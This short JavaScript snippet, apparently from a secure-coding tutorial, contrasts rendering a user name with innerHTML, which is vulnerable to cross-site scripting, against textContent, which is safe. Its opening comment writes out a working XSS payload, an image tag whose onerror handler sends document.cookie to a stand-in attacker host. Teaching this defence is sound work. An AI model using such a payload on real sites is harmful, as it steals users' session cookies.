// A hacker creates an account with the name:
// "<img src='x' onerror='fetch("http://hacker.com/?c=" + document.cookie)'>"

//  VULNERABLE: If you render their name using innerHTML, the browser tries to load 
// the image 'x', fails, triggers 'onerror', and sends all your cookies to the hacker!
profileDiv.innerHTML = `Welcome, ${user.name}!`;

//  SECURE: textContent strictly treats it as raw text. It will never run as code.
// The user will literally just see the raw <img...> text on their screen.
profileDiv.textContent = `Welcome, ${user.name}!`;
